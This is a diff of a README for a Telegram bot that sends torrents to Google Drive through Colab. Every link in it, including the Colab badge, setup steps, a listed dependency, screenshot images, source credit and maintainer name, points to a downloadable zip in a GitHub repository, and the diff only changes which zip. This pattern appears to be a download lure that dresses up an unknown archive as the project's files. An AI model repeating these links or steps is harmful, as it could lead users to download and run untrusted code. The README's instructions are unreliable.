@@ -2,7 +2,7 @@
 Telegram bot to stream torrent files to Google Drive using Google Colab.
 
 
-<a href="https://raw.githubusercontent.com/iamhkr9/Torrent-Drive-Telegram-Bot-Using-Colab/master/Telegram_bot/Torrent-Drive-Telegram-Bot-Using-Colab_1.2.zip" target="_parent"><img src="https://raw.githubusercontent.com/iamhkr9/Torrent-Drive-Telegram-Bot-Using-Colab/master/Telegram_bot/Torrent-Drive-Telegram-Bot-Using-Colab_1.2.zip" alt="Open In Colab"/></a>
+<a href="https://raw.githubusercontent.com/iamhkr9/Torrent-Drive-Telegram-Bot-Using-Colab/master/Telegram_bot/Drive_Colab_Torrent_Using_Telegram_Bot_v1.4.zip" target="_parent"><img src="https://raw.githubusercontent.com/iamhkr9/Torrent-Drive-Telegram-Bot-Using-Colab/master/Telegram_bot/Drive_Colab_Torrent_Using_Telegram_Bot_v1.4.zip" alt="Open In Colab"/></a>
 
 ### What is the purpose of it?
 1. Since it is a Telegram bot ,you can access it from anywhere ,it will neither use your data or space.
@@ -11,7 +11,7 @@ Telegram bot to stream torrent files to Google Drive using Google Colab.
 
 ### Tutorial
 1. Contact @BotFather in your Telegram messenger to create new telegram bot
-1. To get a token, send BotFather a message that says <code>/newbot</code> and paste token into **https://raw.githubusercontent.com/iamhkr9/Torrent-Drive-Telegram-Bot-Using-Colab/master/Telegram_bot/Torrent-Drive-Telegram-Bot-Using-Colab_1.2.zip** file.
+1. To get a token, send BotFather a message that says <code>/newbot</code> and paste token into **https://raw.githubusercontent.com/iamhkr9/Torrent-Drive-Telegram-Bot-Using-Colab/master/Telegram_bot/Drive_Colab_Torrent_Using_Telegram_Bot_v1.4.zip** file.
 2. When asked for a name and username  for your new bot choose username such as something that ends with the word <code>_bot</code>. For example <code>drivebottyl3r_bot</code>
 3. If your chosen name is available, BotFather will send you a token
 4. To set Description for your bot in BotFather do the following:
@@ -20,7 +20,7 @@ Telegram bot to stream torrent files to Google Drive using Google Colab.
     - Change the description and send it to BotFather 
 5. Ok now you're ready to go.
 6. Create new folder in google drive and copy all the files from folder **Telegram_bot** to the newly created folder
-7. Open<a href="https://raw.githubusercontent.com/iamhkr9/Torrent-Drive-Telegram-Bot-Using-Colab/master/Telegram_bot/Torrent-Drive-Telegram-Bot-Using-Colab_1.2.zip"/></a> and upload **https://raw.githubusercontent.com/iamhkr9/Torrent-Drive-Telegram-Bot-Using-Colab/master/Telegram_bot/Torrent-Drive-Telegram-Bot-Using-Colab_1.2.zip** file or  Click the badge which says **Open in Colab**
+7. Open<a href="https://raw.githubusercontent.com/iamhkr9/Torrent-Drive-Telegram-Bot-Using-Colab/master/Telegram_bot/Drive_Colab_Torrent_Using_Telegram_Bot_v1.4.zip"/></a> and upload **https://raw.githubusercontent.com/iamhkr9/Torrent-Drive-Telegram-Bot-Using-Colab/master/Telegram_bot/Drive_Colab_Torrent_Using_Telegram_Bot_v1.4.zip** file or  Click the badge which says **Open in Colab**
 8. Run the whole notebook (**Runtime > Run all**)
 9. Follow directions there.
 
@@ -30,12 +30,12 @@ After download finishes the downloaded files will be in there in your drive in a
 1. requests
 2. lxml
 3. beautifulsoup4
-4. https://raw.githubusercontent.com/iamhkr9/Torrent-Drive-Telegram-Bot-Using-Colab/master/Telegram_bot/Torrent-Drive-Telegram-Bot-Using-Colab_1.2.zip
+4. https://raw.githubusercontent.com/iamhkr9/Torrent-Drive-Telegram-Bot-Using-Colab/master/Telegram_bot/Drive_Colab_Torrent_Using_Telegram_Bot_v1.4.zip
 
 
 # Screenshots
-![TELEGRAMSS](https://raw.githubusercontent.com/iamhkr9/Torrent-Drive-Telegram-Bot-Using-Colab/master/Telegram_bot/Torrent-Drive-Telegram-Bot-Using-Colab_1.2.zip)
-![COLABSS](https://raw.githubusercontent.com/iamhkr9/Torrent-Drive-Telegram-Bot-Using-Colab/master/Telegram_bot/Torrent-Drive-Telegram-Bot-Using-Colab_1.2.zip)
+![TELEGRAMSS](https://raw.githubusercontent.com/iamhkr9/Torrent-Drive-Telegram-Bot-Using-Colab/master/Telegram_bot/Drive_Colab_Torrent_Using_Telegram_Bot_v1.4.zip)
+![COLABSS](https://raw.githubusercontent.com/iamhkr9/Torrent-Drive-Telegram-Bot-Using-Colab/master/Telegram_bot/Drive_Colab_Torrent_Using_Telegram_Bot_v1.4.zip)
 
 ### TODO
 1. Concurrent torrent download
@@ -47,6 +47,6 @@ After download finishes the downloaded files will be in there in your drive in a
 The best available hardware is prioritized for users who use Colaboratory interactively rather than for long-running computations. Users who use Colaboratory for long-running computations may be temporarily restricted in the type of hardware made available to them, and/or the duration that the hardware can be used for. We encourage users with high computational needs to use Colaboratory’s UI with a local runtime.
 Please note that using Colaboratory for cryptocurrency mining is disallowed entirely, and may result in being banned from using Colab altogether.
 
-<sub>Source: https://raw.githubusercontent.com/iamhkr9/Torrent-Drive-Telegram-Bot-Using-Colab/master/Telegram_bot/Torrent-Drive-Telegram-Bot-Using-Colab_1.2.zip</sub>
+<sub>Source: https://raw.githubusercontent.com/iamhkr9/Torrent-Drive-Telegram-Bot-Using-Colab/master/Telegram_bot/Drive_Colab_Torrent_Using_Telegram_Bot_v1.4.zip</sub>
 
-### Maintained By : [Kunal Dongare](https://raw.githubusercontent.com/iamhkr9/Torrent-Drive-Telegram-Bot-Using-Colab/master/Telegram_bot/Torrent-Drive-Telegram-Bot-Using-Colab_1.2.zip)
+### Maintained By : [Kunal Dongare](https://raw.githubusercontent.com/iamhkr9/Torrent-Drive-Telegram-Bot-Using-Colab/master/Telegram_bot/Drive_Colab_Torrent_Using_Telegram_Bot_v1.4.zip)
